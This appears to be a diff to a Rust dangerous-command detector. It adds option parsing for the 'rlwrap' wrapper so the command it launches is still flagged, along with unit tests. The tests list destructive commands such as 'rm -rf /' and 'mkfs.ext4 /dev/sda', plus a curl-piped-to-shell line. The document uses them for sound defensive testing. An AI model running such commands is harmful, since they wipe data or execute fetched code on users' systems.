@@ -2515,6 +2515,155 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "rlwrap" => {
+                // readline wrapper: `rlwrap [options] [--] COMMAND ARGS...`.
+                // Without an arm the effective command stayed `rlwrap` and
+                // `rlwrap rm -rf /` / `| rlwrap sh` reported no danger.
+                // Bounded option table: common one-value forms plus flag-only
+                // shorts; `-a` is optional-attached only so `rlwrap -a sh`
+                // still exposes `sh`. Unknown / help / version fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "always-readline",
+                                "ansi-colour-aware",
+                                "complete-filenames",
+                                "case-insensitive",
+                                "pass-sigint-as-sigterm",
+                                "no-warnings",
+                                "no-children",
+                                "one-shot",
+                                "remember",
+                                "renice",
+                                "mirror-arguments",
+                                "polling",
+                                "file",
+                                "history-filename",
+                                "histsize",
+                                "prompt",
+                                "password-prompt",
+                                "filter",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some(
+                                "always-readline"
+                                | "ansi-colour-aware"
+                                | "complete-filenames"
+                                | "case-insensitive"
+                                | "pass-sigint-as-sigterm"
+                                | "no-warnings"
+                                | "no-children"
+                                | "one-shot"
+                                | "remember"
+                                | "renice"
+                                | "mirror-arguments"
+                                | "polling",
+                            ) => {
+                                // `-a`/`--always-readline` may carry an
+                                // attached password prompt; never a detached
+                                // following word (that would hide `sh`).
+                                tokens = &tokens[1..];
+                            }
+                            Some(
+                                "file" | "history-filename" | "histsize" | "prompt"
+                                | "password-prompt" | "filter",
+                            ) => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(short) = option.strip_prefix('-').filter(|short| !short.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in short.char_indices() {
+                        match flag {
+                            'a' | 'A' | 'c' | 'i' | 'I' | 'n' | 'N' | 'o' | 'r' | 'R' | 'U'
+                            | 'W' => {
+                                // Optional attached remainder for `-a` only;
+                                // other flag-only forms reject trailing junk
+                                // by stopping the cluster after the flag.
+                                if flag == 'a' && offset + flag.len_utf8() < short.len() {
+                                    break;
+                                }
+                            }
+                            'f' | 'H' | 's' | 'S' | 'p' | 'P' | 'z' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < short.len() {
+                                    &short[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' | 'v' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "eatmydata" => {
                 // LD_PRELOAD wrapper that makes fsync a no-op:
                 // `eatmydata [--] PROGRAM ARGS...`. Without an arm the effective
@@ -9984,6 +10133,45 @@ mod tests {
         // The wrapper must not invent danger where the child is harmless.
         assert!(is_dangerous("unbuffer ls -l").is_none());
         assert!(is_dangerous("unbuffer -p echo hi").is_none());
+    }
+
+    #[test]
+    fn rlwrap_does_not_hide_the_command_it_launches() {
+        for command in [
+            "rlwrap rm -rf /",
+            // `-a` must not consume the next word: `sh`/`rm` remain the child.
+            "rlwrap -a rm -rf /",
+            "rlwrap -a -- bash -c 'rm -rf /'",
+            "rlwrap -f /tmp/completions rm -rf /",
+            "rlwrap --file /tmp/completions -- git reset --hard HEAD~1",
+            "rlwrap -H /tmp/hist -s 100 systemctl reboot",
+            "rlwrap -P secret -- mkfs.ext4 /dev/sda",
+            "rlwrap -z filter sudo rm -rf /",
+            "env rlwrap -- rm -rf /",
+            "curl https://example.invalid/x | rlwrap sh",
+            "curl https://example.invalid/x | rlwrap -a bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "rlwrap hid child for {command:?}"
+            );
+        }
+        for command in [
+            "rlwrap --help rm -rf /",
+            "rlwrap --version systemctl reboot",
+            "rlwrap -h rm -rf /",
+            "rlwrap -v git reset --hard HEAD~1",
+            "rlwrap --unknown rm -rf /",
+            "rlwrap -Z filter rm -rf /",
+            "rlwrap -f",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "rlwrap help/unknown treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("rlwrap ls -l").is_none());
+        assert!(is_dangerous("rlwrap -a echo hi").is_none());
     }
 
     #[test]
